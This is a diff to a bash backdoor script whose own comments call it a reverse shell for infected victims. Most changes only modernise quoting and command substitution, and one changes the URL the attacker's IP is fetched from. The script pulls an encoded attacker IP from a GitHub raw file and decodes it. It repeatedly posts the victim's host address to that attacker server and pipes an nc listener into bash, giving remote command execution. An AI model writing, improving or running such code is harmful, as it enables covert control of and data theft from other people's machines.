@@ -9,7 +9,7 @@ DEBUG_MODE="false"
 SLEEP_TIME=20
 
 # GET ENCRYPTED IP FROM THIS LINK
-URL="https://raw.githubusercontent.com/erucix/-/main/README.md"
+URL="https://raw.githubusercontent.com/erucix/-/main/ip.txt"
 
 # Get saved encoded IP from somewhere
 # Keep it far from you and controllable
@@ -18,7 +18,7 @@ URL="https://raw.githubusercontent.com/erucix/-/main/README.md"
 # ip(attacker's) for the infected victims
 function get_ip {
 
-  RESPONSE=`curl -s --fail $URL`
+  RESPONSE=$(curl -s --fail $URL)
 
   if [ $? -ne 0 ]
   then
@@ -26,7 +26,7 @@ function get_ip {
     exit 1
   fi
 
-  echo $RESPONSE
+  echo "$RESPONSE"
 }
 
 
@@ -47,20 +47,20 @@ function decode_ip {
     CURRENT_CHAR=${IP:$i:1}
     NEW_CHAR=""
   
-    if [ $CURRENT_CHAR = "." ]
+    if [ "$CURRENT_CHAR" = "." ]
     then
       NEW_CHAR=$CURRENT_CHAR
-    elif [ $CURRENT_CHAR = "#" ]
+    elif [ "$CURRENT_CHAR" = "#" ]
     then
       NEW_CHAR=9
     else
-      NEW_CHAR=`expr $CURRENT_CHAR - 1`
+      NEW_CHAR=$(expr $CURRENT_CHAR - 1)
     fi
 
     NEW_IP="${NEW_IP}${NEW_CHAR}"
   done
 
-  echo $NEW_IP
+  echo "$NEW_IP"
 }
 
 # Open reverse shell in victim's device
@@ -68,9 +68,9 @@ function decode_ip {
 # but in ncat thus we can't use the 
 # safe one so going with | bash
 function open_reverse_shell {
-  TRAFFIC_STATUS=`should_create_traffic`
+  TRAFFIC_STATUS=$(should_create_traffic)
 
-  if [ $TRAFFIC_STATUS = "true" ]
+  if [ "$TRAFFIC_STATUS" = "true" ]
   then
     nc -lnkp $VICTIM_PORT | $(/usr/bin/env bash)  > /dev/null 2>&1
   else
@@ -97,14 +97,14 @@ function delete_history {
 function send_presence {
   while true
   do
-    TRAFFIC_STATUS=`should_create_traffic $1`
+    TRAFFIC_STATUS=$(should_create_traffic $1)
 
-    if [ $TRAFFIC_STATUS = "true" ]
+    if [ "$TRAFFIC_STATUS" = "true" ]
     then
       ATTACKER_IP=$1
-      PRESENCE_RESPONSE=`curl -s --fail -X POST http://$ATTACKER_IP:$ATTACKER_PORT/presence -d $(hostname -I)`
+      PRESENCE_RESPONSE=$(curl -s --fail -X POST http://$ATTACKER_IP:$ATTACKER_PORT/presence -d $(hostname -I))
 
-      if [ ! $PRESENCE_RESPONSE = "ACK" ]
+      if [ ! "$PRESENCE_RESPONSE" = "ACK" ]
       then
         log "[+] Attacker server not available."
       fi
@@ -122,7 +122,7 @@ function send_presence {
 function should_create_traffic {
   ATTACKER_IP=$1
 
-  RESPONSE=`curl -s --fail http://$ATTACKER_IP:$ATTACKER_PORT`
+  RESPONSE=$(curl -s --fail http://$ATTACKER_IP:$ATTACKER_PORT)
 
   if [[ $RESPONSE = "NO" && $? -ne 0 ]]
   then
@@ -169,7 +169,7 @@ function check_if_installed {
 }
 
 function log {
-  if [ $DEBUG_MODE = "true" ]
+  if [ "$DEBUG_MODE" = "true" ]
   then
     echo "$1"
   fi
@@ -178,10 +178,10 @@ function log {
 # Main entry point of program
 function main {
   log "[+] Checking pre-installation"
-  INSTALL_STATUS=`check_if_installed`
+  INSTALL_STATUS=$(check_if_installed)
   sleep .2
 
-  if [ $INSTALL_STATUS = "false" ]
+  if [ "$INSTALL_STATUS" = "false" ]
   then
     log "[+] Beginning installation."
     install_script
@@ -195,25 +195,25 @@ function main {
   sleep .2
 
   log "[+] Checking if server is already running"
-  SERVER_STATUS=`is_shell_running`
+  SERVER_STATUS=$(is_shell_running)
   sleep .2
 
-  if [ $SERVER_STATUS = "true" ]
+  if [ "$SERVER_STATUS" = "true" ]
   then
     log "[+] Server is running so, I am exitting"
     exit 1
   fi
 
   log "[+] Fetching attacker encoded IP"
-  ENCODED_IP=`get_ip`
+  ENCODED_IP=$(get_ip)
   sleep .2
 
   log "[+] Decoding IP"
-  DECODED_IP=`decode_ip $ENCODED_IP`
+  DECODED_IP=$(decode_ip $ENCODED_IP)
   sleep .2
 
   log "[+] Initiating presence sender"
-  send_presence $DECODED_IP &
+  send_presence "$DECODED_IP" &
   sleep .2
 
   log "[+] Starting reverse shell server"
